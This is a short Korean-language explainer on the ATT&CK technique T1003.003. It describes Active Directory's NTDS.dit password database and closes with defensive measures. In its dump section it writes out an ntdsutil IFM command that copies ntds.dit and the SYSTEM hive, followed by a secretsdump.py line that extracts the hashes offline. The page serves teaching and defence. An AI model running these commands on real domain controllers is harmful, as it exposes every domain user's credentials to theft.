T1003.003: NTDS.dit

Credential Access

NTDS.dit

Active Directory의 모든 사용자 비밀번호가 저장된 핵심 데이터베이스

#1. NTDS.dit이란?

"회사 전체 직원 명부" 비유

SAM이 한 컴퓨터의 '비밀번호 금고'라면, NTDS.dit은 회사 전체의 직원 명부입니다. 도메인 컨트롤러(DC)에 저장되며, 도메인의 모든 사용자 계정, 그룹, 컴퓨터 계정, 그리고 비밀번호 해시가 이 파일에 들어있습니다. 파일 크기가 수 GB에 달하며, 위치는 C:\Windows\NTDS\ntds.dit입니다.

#2. NTDS.dit 덤프 기법

ntdsutil을 이용한 공격

Windows 내장 도구인 ntdsutil의 IFM(Install From Media) 기능으로 AD 데이터베이스를 합법적으로 덤프할 수 있습니다. 이 기능은 원래 새 DC를 설치할 때 사용하지만, 공격자가 악용합니다.

# ntdsutil IFM 방법
ntdsutil "activate instance ntds" "ifm"
"create full C:\temp\ntds_dump" quit quit
[+] ntds.dit + SYSTEM 추출됨
# 이후 오프라인 해시 추출
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

방어 방법

  • ntdsutil/vssadmin 실행 모니터링: DC에서의 실행을 알림
  • DC 접근 최소화: 도메인 관리자 수를 최소한으로 유지
  • Tier 모델: DC 관리용 전용 관리 계정 사용
